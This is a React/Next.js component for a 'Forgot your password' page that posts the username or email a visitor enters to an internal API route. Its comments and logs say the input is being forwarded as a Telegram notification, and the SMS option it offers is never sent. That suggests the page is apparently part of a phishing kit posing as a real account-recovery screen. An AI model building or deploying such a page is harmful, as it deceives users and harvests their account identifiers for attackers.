"use client"

import FormInput from '@/components/signin/FormInput';
import { useState } from 'react';

export default function EmailRecovery() {
  const [email, setEmail] = useState('');
   const [selectedOption, setSelectedOption] = useState<'email' | 'sms'>('email');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Send to Telegram
    try {
      const res = await fetch('/api/forgot-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });

      const result = await res.json();
      if (result.success) {
        console.log("Telegram notification sent!");
      } else {
        console.error("Telegram error:", result.error);
      }
    } catch (err) {
      console.error("Telegram fetch failed:", err);
    }
  };

  return (
    <div className="space-y-6">
      <div className='pt-3' />
      
      
      <div className="space-y-3">
        

      <h2 className="text-[1.5rem] font-bold text-gray-700">Forgot your password</h2>
      <form onSubmit={handleSubmit} method='POST' className="space-y-3">
        <div className="space-y-4">
          <FormInput 
            id="username" 
            label="Username or email" 
            type="text" 
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          
          <p className='text-left text-black'>We will send you a code. Where would you like it sent?</p>
          
          <div className="flex flex-col space-y-4">
        <label className="flex items-center space-x-2 cursor-pointer">
          <div className={`w-5 h-5 rounded-full border-2 ${selectedOption === 'email' ? 'border-[#254a7e] bg-[#254a7e]' : 'border-gray-300'} flex items-center justify-center`}>
            {selectedOption === 'email' && (
              <div className="w-2 h-2 rounded-full bg-white"></div>
            )}
          </div>
          <span className="text-gray-700">Email</span>
          <input
            type="radio"
            name="notification"
            value="email"
            checked={selectedOption === 'email'}
            onChange={() => setSelectedOption('email')}
            className="sr-only"
          />
        </label>

        <label className="flex items-center space-x-2 cursor-pointer">
          <div className={`w-5 h-5 rounded-full border-2 ${selectedOption === 'sms' ? 'border-[#254a7e] bg-[#254a7e]' : 'border-gray-300'} flex items-center justify-center`}>
            {selectedOption === 'sms' && (
              <div className="w-2 h-2 rounded-full bg-white"></div>
            )}
          </div>
          <span className="text-black">SMS</span>
          <input
            type="radio"
            name="notification"
            value="sms"
            checked={selectedOption === 'sms'}
            onChange={() => setSelectedOption('sms')}
            className="sr-only"
          />
        </label>
      </div>

          <div className='flex space-x-4 items-left pb-20'>
            <button type="submit" className="w-1/3 py-3 bg-[#66d3ee] hover:bg-[#254a7e] text-[#172f50] hover:text-white font-bold hover:font-bold rounded-md">
            Next
          </button>
          <button type='button' className="w-1/3 py-3 bg-white border border-[#172f50] hover:bg-[#254a7e] text-[#172f50] hover:text-white font-bold hover:font-bold rounded-md">
            Cancel
          </button>
          </div>
        </div>
      </form>
      </div>
    </div>
  );
}